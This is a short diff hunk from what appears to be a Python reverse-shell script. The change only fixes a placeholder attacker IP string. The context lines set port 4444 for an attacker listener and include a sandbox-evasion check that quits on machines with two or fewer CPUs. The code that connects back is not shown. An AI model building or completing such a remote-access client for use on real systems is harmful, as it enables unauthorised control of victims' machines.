@@ -5,7 +5,7 @@ import subprocess
 if os.cpu_count() <= 2:
     quit()
 
-HOST = '<Attacker IP ADDRESS' #Attacker_Machine_IP
+HOST = '<Attacker IP ADDRESS>' #Attacker_Machine_IP
 PORT = 4444 #Port Listner Attacker
 
 #Connect to the listner function start
